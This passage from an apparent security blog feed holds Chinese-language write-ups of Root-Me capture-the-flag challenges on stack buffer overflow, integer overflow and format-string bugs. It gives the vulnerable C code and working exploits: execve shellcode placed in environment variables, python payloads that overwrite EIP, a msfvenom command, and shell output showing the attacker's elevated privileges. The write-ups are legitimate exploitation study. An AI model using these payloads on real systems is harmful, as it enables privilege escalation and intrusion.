    <content type="html"><![CDATA[<p>ELF x86 - Stack buffer overflow basic 5</p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(fgets(buff, BUFFER, file) != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    chomp(buff);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buff, <span class="string">&quot;USERNAME=&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        cpstr(init.username, buff+<span class="number">9</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> init;</span><br></pre></td></tr></table></figure><a id="more"></a><p>æ•°æ®è¯»å…¥bufferï¼Œ<code>ebp-0x2a5</code>ï¼Œ åªèƒ½è¯»512å­—ç¬¦+â€™\nâ€™ã€‚ä¸èƒ½åˆ°EIPï¼Œä½†è¿™æ®µä»£ç èµ‹å€¼åˆ°initï¼Œæ²¡æœ‰æ£€æŸ¥è¾¹ç•Œï¼Œinitèµ·å§‹åœ°å€<code>ebp-0xa4 </code>ï¼Œæ¯”è¾ƒå°å¥½æº¢å‡ºã€‚</p><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>å‡½æ•°æœ€åï¼Œä¼šå°†æœ¬åœ°å˜é‡initèµ‹å€¼åˆ°å¤–éƒ¨initæ‰€åœ¨åœ°å€ï¼Œä½äº<code>$ebp+0x8</code>ï¼Œå€¼ä¸º<code>0xbffffb00</code>ï¼Œå› ä¸ºbuffæœ€åâ€™\nâ€™å˜ä¸ºâ€™\00â€™ï¼Œä¸ºäº†èƒ½å¤Ÿæ‰§è¡Œï¼Œshellcodeæœ€åè¿˜è¦åŠ ä¸Š<code>$ebp+0x8</code>ï¼Œæ­¤æ—¶åˆšå¥½æœ‰ä¸ªâ€™00â€™ï¼Œæ‰€ä»¥ä¸ç”¨åŠ åœ°å€ä¹Ÿèƒ½è¿è¡Œï¼Œä½†æœ€åè¿˜æ˜¯æ®µé”™è¯¯ã€‚<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205</a><br>æœ€åç”¨åˆ°è¿™ç¯‡çš„æ–¹æ³•ï¼š<br><a href="https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/">https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</a></p><h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><ol><li><code>wget https://raw.githubusercontent.com/Finsenty54/-python/master/findenv.c</code></li><li><code>gcc -o findenv findenv.c</code></li><li><code>export JUNK=(python -c &quot;print &#39;B&#39; * 1000&quot;)</code></li><li><code>export SHELCODE=(python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;)</code></li><li><code>/tmp/findenv JUNK ./ch10</code><br>JUNK will be at 0xbffffac2</li><li><code>/tmp/findenv SHELCODE ./ch10</code><br>SHELCODE will be at 0xbfffff4d</li><li><code>(python -c &quot;print &#39;USERNAME=&#39;+&#39;\x90&#39;*136+&#39;\x60\xb1\x04\x08&#39;+&#39;A&#39;*28+&#39;\x4d\xff\xff\xbf&#39;+&#39;\xc2\xfa\xff\xbf&#39;&quot;) &gt; /var/tmp/data.txt</code></li></ol><pre><code>app-systeme-ch10@challenge02:~$ ./ch10 /var/tmp/data.txtbash-4.4$ iduid=1110(app-systeme-ch10) gid=1110(app-systeme-ch10) euid=1210(app-systeme-ch10-cracked) groups=1110(app-systeme-ch10),100(users)bash-4.4$ cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;ELF x86 - Stack buffer overflow basic 5&lt;/p&gt;
&lt;h2 id=&quot;æºç &quot;&gt;&lt;a href=&quot;#æºç &quot; class=&quot;headerlink&quot; title=&quot;æºç &quot;&gt;&lt;/a&gt;æºç &lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(fgets(buff, BUFFER, file) != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chomp(buff);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(buff, &lt;span class=&quot;string&quot;&gt;&amp;quot;USERNAME=&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cpstr(init.username, buff+&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fclose(file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; init;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer and integer overflow</title>
    <link href="http://finsenty54.github.io/2021/01/07/Stack_buffer_and_integer_overflow/"/>
    <id>http://finsenty54.github.io/2021/01/07/Stack_buffer_and_integer_overflow/</id>
    <published>2021-01-07T08:30:11.000Z</published>
    <updated>2021-01-07T08:31:09.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Stack-buffer-and-integer-overflow"><a href="#ELF-x86-Stack-buffer-and-integer-overflow" class="headerlink" title="ELF x86 - Stack buffer and integer overflow"></a>ELF x86 - Stack buffer and integer overflow</h1><p>æ°¸è¿œçš„ç¥ï¼šï¼š<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow</a></p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>ä¸ºäº†è®©shellæ›´å®ç”¨<br>è¦†ç›–<code>EIP</code>, ä½¿ç”¨ç°æœ‰çš„å‘½ä»¤çš„åœ°å€ï¼Œä¾‹å¦‚<code>jmp esp</code> ï¼Œ è·³è½¬buffer ï¼Œ åé¢æ˜¯shellcode</p><h3 id="æŸ¥æ‰¾jmp-call-espåœ°å€"><a href="#æŸ¥æ‰¾jmp-call-espåœ°å€" class="headerlink" title="æŸ¥æ‰¾jmp/call espåœ°å€"></a>æŸ¥æ‰¾jmp/call espåœ°å€</h3><ol><li>å¯ä»¥åœ¨å…±äº«åº“ä¸­æ‰¾</li><li>ä¹Ÿå¯ä»¥åœ¨è‡ªèº«ç¨‹åºæ‰¾å‘½ä»¤<a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$objdump -d vulnerable_1 | grep <span class="string">&quot;eax&quot;</span></span><br><span class="line"><span class="number">1019</span>:ff d0                call   *%eax</span><br></pre></td></tr></table></figure>æˆ–è€…å¯åŠ¨<code>metasploit-framework</code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfelfscan -j eax vulnerable_1</span><br><span class="line">[*] exec: msfelfscan -j eax vulnerable_1</span><br><span class="line">[vulnerable_1]</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br></pre></td></tr></table></figure>â€œjmp/call eaxâ€éƒ½è¡Œ<br>use linux/x86/exec<h3 id="ç”¨msfvenomç”Ÿæˆpayload"><a href="#ç”¨msfvenomç”Ÿæˆpayload" class="headerlink" title="ç”¨msfvenomç”Ÿæˆpayload"></a>ç”¨msfvenomç”Ÿæˆpayload</h3><code>Msfvenom</code> åœ¨ 2015 å¹´ 6 æœˆ 8 æ—¥å·²ç»æ›¿ä»£äº† msfpayload ä¸ msfenocde å‘½ä»¤ï¼Œå®ƒæ˜¯è¿™ä¸¤ä¸ªå‘½ä»¤çš„ç»“åˆä½“ã€‚<br><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a><br><code>msfvenom -p linux/x86/exec CMD=dash R -a x86 -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python </code></li></ol><hr><h2 id="æ•´æ•°æº¢å‡º"><a href="#æ•´æ•°æº¢å‡º" class="headerlink" title="æ•´æ•°æº¢å‡º"></a>æ•´æ•°æº¢å‡º</h2><p><a href="https://sploitfun.wordpress.com/2015/06/23/integer-overflow/">https://sploitfun.wordpress.com/2015/06/23/integer-overflow/</a></p><p>Storing<code>a value greater</code>than <code>maximum supported value</code> is called integer overflow.  an integer overflow might <code>lead to stack overflow or heap overflow</code> which could result in arbitrary code execution.<br>å¯¹æ•°ç»„é•¿åº¦æ£€æŸ¥å¤±æ•ˆ</p><p>Similarly storing a value lesser than the minimum supported value is called integer underflow.</p><p><code> 261</code> gets wrapped around and stored as 5 in â€˜passwd_lenâ€™ variable<br><code>000100000101 å–8ä½ ä¸º5</code></p><hr><h2 id="æœ¬é¢˜"><a href="#æœ¬é¢˜" class="headerlink" title="æœ¬é¢˜"></a>æœ¬é¢˜</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER 128</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_file</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> path[BUFFER+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> size;  </span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(read(fd, &amp;size, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) != <span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] File too short.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(size &gt;= BUFFER)  <span class="comment">//ç»•è¿‡æ£€æŸ¥</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Path too long.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  read_data(path, fd, size);</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Need a absolute path.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] The pathname is : %s\n&quot;</span>, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="read-å‘½ä»¤"><a href="#read-å‘½ä»¤" class="headerlink" title="read å‘½ä»¤"></a>read å‘½ä»¤</h3><p>ssize_t read(int fd, void *buf, size_t count);<br>read() attempts to <strong>read up to count bytes **from file descriptor fd into the</strong> buffer starting at buf**.</p><p> On success, the <code>number of bytes read is returned</code> (zero indicates end of file), and the file position is <strong>advanced by this number.</strong></p><hr><h3 id="æœ‰ç¬¦å·æ•°è¡¥ç "><a href="#æœ‰ç¬¦å·æ•°è¡¥ç " class="headerlink" title="æœ‰ç¬¦å·æ•°è¡¥ç "></a>æœ‰ç¬¦å·æ•°è¡¥ç </h3><p>Because itâ€™s a <code>signed int</code> variable, <code>0xffffffff equals to -1</code>.</p><p>ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ä¸­<br>æœ‰ç¬¦å·æ•°æ•´æ•°è¡¨ç¤º:<br>1011=<code>-1*2^3+0*2^2+1*2^1+1*2^0</code>=-5<br>1000=-8<br> 0111=7<br>1111=-1<br>æ‰€ä»¥<code>0xffffffff=-0x800000+0x7fffffff=-1</code></p><h3 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><p>ç®€å•é€†å‘åï¼Œå°±çŸ¥é“å¤šå°‘èƒ½åˆ°EIP</p><p><code>(python -c &quot;print &#39;\xff&#39;*4+&#39;/&#39;+&#39;A&#39;*156+&#39;B&#39;*4)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stopped reason: SIGSEGV</span><br><span class="line"><span class="number">0x42424242</span> in ?? ()</span><br></pre></td></tr></table></figure><h3 id="gdbå†…å¤–åœ°å€æ˜¯ä¸åŒçš„"><a href="#gdbå†…å¤–åœ°å€æ˜¯ä¸åŒçš„" class="headerlink" title="gdbå†…å¤–åœ°å€æ˜¯ä¸åŒçš„"></a>gdbå†…å¤–åœ°å€æ˜¯ä¸åŒçš„</h3><p>shellcode æ”¾åœ¨0xbffffa60<br>â€˜\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80â€™ 33é•¿</p><p>(python -c â€œprint â€˜\xffâ€™*4+â€™/â€˜+â€™Aâ€™*156+â€™0xbffffa60â€™[::-1]) &gt; /tmp/data.txt<br>ä½†æ˜¯è¿˜æ˜¯æ®µé”™è¯¯</p><p>It happens because the <code>addresses are different</code> between inside and outside of gdb (someone told me itâ€™s because the additional environment variables gdb sets).</p><p>So to come around it, and find the actual address of the shellcode outside gdb, one can use the<code> -e switch of the strace tool</code>.<br>The -e switch enables one to set an expression which will affect the toolâ€™s output. For example, for seeing the <code>second argument of read as an address instead of the string.</code></p><p><code>$strace -e raw=read ./ch11 /tmp/data.txt</code><br>é‡æ–°è®¾ç½®shellcodeåœ°å€</p><pre><code>app-systeme-ch11@challenge02:~$ ./ch11 /tmp/data.txt[+] The pathname is : /j                        Xâ„¢Rfh-pâ€°Ã¡Rjhh/bash/binâ€°Ã£RQSâ€°Ã¡ Ì€Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â°ÃºÃ¿Â¿bash-4.4$ iduid=1111(app-systeme-ch11) gid=1111(app-systeme-ch11) euid=1211(app-systeme-ch11-cracked) groups=1111(app-systeme-ch11),100(users)</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Stack-buffer-and-integer-overflow&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-and-integer-overflow&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer and integer overflow&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer and integer overflow&lt;/h1&gt;&lt;p&gt;æ°¸è¿œçš„ç¥ï¼šï¼š&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ret2reg&quot;&gt;&lt;a href=&quot;#ret2reg&quot; class=&quot;headerlink&quot; title=&quot;ret2reg&quot;&gt;&lt;/a&gt;ret2reg&lt;/h2&gt;&lt;p&gt;ä¸ºäº†è®©shellæ›´å®ç”¨&lt;br&gt;è¦†ç›–&lt;code&gt;EIP&lt;/code&gt;, ä½¿ç”¨ç°æœ‰çš„å‘½ä»¤çš„åœ°å€ï¼Œä¾‹å¦‚&lt;code&gt;jmp esp&lt;/code&gt; ï¼Œ è·³è½¬buffer ï¼Œ åé¢æ˜¯shellcode&lt;/p&gt;
&lt;h3 id=&quot;æŸ¥æ‰¾jmp-call-espåœ°å€&quot;&gt;&lt;a href=&quot;#æŸ¥æ‰¾jmp-call-espåœ°å€&quot; class=&quot;headerlink&quot; title=&quot;æŸ¥æ‰¾jmp/call espåœ°å€&quot;&gt;&lt;/a&gt;æŸ¥æ‰¾jmp/call espåœ°å€&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;å¯ä»¥åœ¨å…±äº«åº“ä¸­æ‰¾&lt;/li&gt;
&lt;li&gt;ä¹Ÿå¯ä»¥åœ¨è‡ªèº«ç¨‹åºæ‰¾å‘½ä»¤</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Format String Bug Basic 3</title>
    <link href="http://finsenty54.github.io/2021/01/03/Format_String_Bug_Basic_3/"/>
    <id>http://finsenty54.github.io/2021/01/03/Format_String_Bug_Basic_3/</id>
    <published>2021-01-03T02:34:05.000Z</published>
    <updated>2021-01-07T09:15:42.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Format-String-Bug-Basic-3"><a href="#ELF-x86-Format-String-Bug-Basic-3" class="headerlink" title="ELF x86 - Format String Bug Basic 3"></a>ELF x86 - Format String Bug Basic 3</h1><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// char    log_file = &quot;/var/log/bin_error.log&quot;;</span></span><br><span class="line">    <span class="keyword">char</span>    outbuf[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    buffer[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    user[<span class="number">12</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *username = <span class="string">&quot;root-me&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// FILE *fp_log = fopen(log_file, &quot;a&quot;);</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">    fgets(user, <span class="keyword">sizeof</span>(user), <span class="built_in">stdin</span>);</span><br><span class="line">    user[<span class="built_in">strlen</span>(user) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(user, username)) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">sprintf</span> (buffer, <span class="string">&quot;ERR Wrong user: %400s&quot;</span>, user);</span><br><span class="line">        <span class="built_in">sprintf</span> (outbuf, buffer);</span><br><span class="line">        <span class="comment">// fprintf (fp_log, &quot;%s\n&quot;, outbuf);</span></span><br><span class="line">   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bad username: %s\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s ! How are you ?\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// fclose(fp_log);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤§ä½“æ€è·¯"><a href="#å¤§ä½“æ€è·¯" class="headerlink" title="å¤§ä½“æ€è·¯"></a>å¤§ä½“æ€è·¯</h2><ol><li>shellcode æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­</li><li>æº¢å‡ºï¼Œæ§åˆ¶EIPï¼ŒæŒ‡å‘shellcode</li></ol><h3 id="snprintf-amp-sprintf"><a href="#snprintf-amp-sprintf" class="headerlink" title="snprintf &amp; sprintf"></a>snprintf &amp; sprintf</h3><pre><code>int snprintf(char *restrict s, size_t n,       const char *restrict format, ...);int sprintf(char *restrict s, const char *restrict format, ...);</code></pre><p>åé¢è·Ÿç€format</p><p>å­—ç¬¦ä¸²æ¼æ´ overwrite the GOT entry</p><p><code>$ ulimit -s unlimited </code>å…³é—­ASLR</p><hr><p>å¯ä»¥æŒ‡å®šå®½åº¦ï¼Œä¸è¶³çš„å·¦è¾¹è¡¥ç©ºæ ¼ï¼š<br>    sprintf(s, â€œ%8d%8dâ€, 123, 4567); //äº§ç”Ÿï¼šâ€ 123 4567â€</p><hr><h3 id="å¾—åˆ°æ®µé”™è¯¯"><a href="#å¾—åˆ°æ®µé”™è¯¯" class="headerlink" title="å¾—åˆ°æ®µé”™è¯¯"></a>å¾—åˆ°æ®µé”™è¯¯</h3><p><code>char *s1 @ ebp-0x414 </code> è¾“å…¥æ”¾åœ¨è¿™é‡Œ</p><p>push ebp<br>æ­¤æ—¶esp æŒ‡å‘ebpå†…çš„å€¼</p><p><code>0x804858b &lt;main+133&gt;:        lea    eax,[ebp-0x408]</code><br>å­˜æ”¾buffer</p><pre><code>gdb-peda$ x/1s $ebp-0x4080xbffff730:     &quot;ERR Wrong user:&quot;, &#39; &#39; &lt;repeats 185 times&gt;...</code></pre><p><code>0x80485a1 &lt;main+155&gt;:        lea    eax,[ebp-0x208]</code><br>å­˜æ”¾outbuffer</p><pre><code>gdb-peda$ x/100s $ebp+0x2000xbffffe01:     &quot;SHELLCODE=j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</code></pre><p>Then buffer is set to ERR Wrong user: &lt;400-9 whitespaces&gt;%200xAAAA<br>ERR Wrong user:  é•¿åº¦æ˜¯16</p><p> outbuf is set to ERR Wrong user: &lt;400-9 whitespaces&gt;&lt;200 bytes&gt;AAAA</p><p>576 space +7 =583 ä¸ªspace  + 8å­—èŠ‚ + AAAA<br>å› ä¸º%xæ‰“å°8ä¸ªæ•°ï¼Œç„¶åå†å­˜çš„è¯å°±æ˜¯8å­—èŠ‚<br>gdb-peda$ x/1s $ebp<br>0xbffffb18:     â€˜ â€˜ &lt;repeats 79 times&gt;, â€œ30303225AAAAâ€</p><p>é‚£ä¹ˆ<br>113 è¦†ç›–ebpçš„ä½ç½®<br>EBP: 0xbffffb18 (â€œaaaaâ€)</p><p>%117xaaaa<br>æ‰§è¡Œleaveåï¼ŒespæŒ‡å‘aaaa<br>EIP: 0x61616161 (â€˜aaaaâ€™)</p><p>shellcode</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELLCODE=`python -c &#x27;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#x27;`</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">1</span>s <span class="number">0xbffffe02</span>+<span class="number">0xa</span></span><br><span class="line"><span class="number">0xbffffe0c</span>:     <span class="string">&quot;j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</span></span><br></pre></td></tr></table></figure><p>palyload:<br>(python 